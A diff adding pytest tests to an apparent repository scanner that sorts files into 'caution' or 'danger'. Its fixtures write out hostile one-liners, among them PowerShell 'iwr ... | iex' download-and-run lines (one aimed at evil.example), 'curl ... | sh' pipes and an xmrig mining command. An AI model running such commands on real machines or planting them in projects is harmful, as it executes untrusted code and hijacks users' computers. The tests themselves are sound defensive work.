@@ -427,3 +427,53 @@ def test_repo_check_other_danger_in_setup_folders_stays_danger(tmp_path):
     (tmp_path / ".github").mkdir()
     (tmp_path / ".github" / "x.ps1").write_text("iwr https://evil.example/a.ps1 | iex\n", encoding="utf-8")
     assert repo_check.scan(tmp_path, NO_DEFENDER).verdict == "danger"
+
+
+# -- repo_check, item f (owner's decision, 21 Nov 2026) -----------------------------------------------------------
+
+@pytest.mark.parametrize("where", [".devcontainer/setup.sh", ".github/workflows/ci.yml", ".devcontainer/Dockerfile"])
+def test_curl_pipe_sh_in_setup_folders_is_check_first(tmp_path, where):
+    from prometheus.repo_check import check_and_keep
+
+    folder = tmp_path / "r"
+    (folder / Path(where).parent).mkdir(parents=True)
+    (folder / where).write_text("curl -fsSL https://get.example.dev/install | sh\n", encoding="utf-8")
+    rep = check_and_keep(folder, defender=NO_DEFENDER)
+    assert rep.verdict == "caution" and folder.exists()                      # kept, with the reason shown
+    assert any(level == "caution" and "downloads and runs code" in what and Path(loc) == Path(where)
+               for level, what, loc in rep.findings)
+
+
+@pytest.mark.parametrize("where", ["install.sh", "scripts/setup.sh", "src/.github/x.sh", "a.devcontainer/x.sh",
+                                   ".github"])
+def test_curl_pipe_sh_anywhere_else_is_still_danger(tmp_path, where):
+    from prometheus.repo_check import check_and_keep
+
+    folder = tmp_path / "r"
+    (folder / Path(where).parent).mkdir(parents=True, exist_ok=True)
+    (folder / where).write_text("curl -fsSL https://get.example.dev/install | sh\n", encoding="utf-8")
+    rep = check_and_keep(folder, defender=NO_DEFENDER)
+    assert rep.verdict == "danger" and not folder.exists()
+
+
+def test_powershell_download_and_run_in_github_folder_is_still_danger(tmp_path):
+    from prometheus.repo_check import scan
+
+    folder = tmp_path / "r"
+    (folder / ".github").mkdir(parents=True)
+    (folder / ".github" / "x.ps1").write_text("iwr https://x.example/a.ps1 | iex\n", encoding="utf-8")
+    assert scan(folder, defender=NO_DEFENDER).verdict == "danger"
+    (folder / ".github" / "x.ps1").write_text("curl https://a.example | sh\niwr https://x.example/a.ps1 | iex\n",
+                                             encoding="utf-8")
+    assert scan(folder, defender=NO_DEFENDER).verdict == "danger"      # a curl line doesn't excuse the other
+
+
+def test_other_dangers_in_setup_folders_are_still_danger(tmp_path):
+    from prometheus.repo_check import scan
+
+    folder = tmp_path / "r"
+    (folder / ".devcontainer").mkdir(parents=True)
+    (folder / ".devcontainer" / "x.sh").write_text("curl https://a.example | sh\nxmrig --url stratum+tcp://p:1\n",
+                                                   encoding="utf-8")
+    rep = scan(folder, defender=NO_DEFENDER)
+    assert rep.verdict == "danger" and any(w == "mines crypto" for _, w, _ in rep.findings)
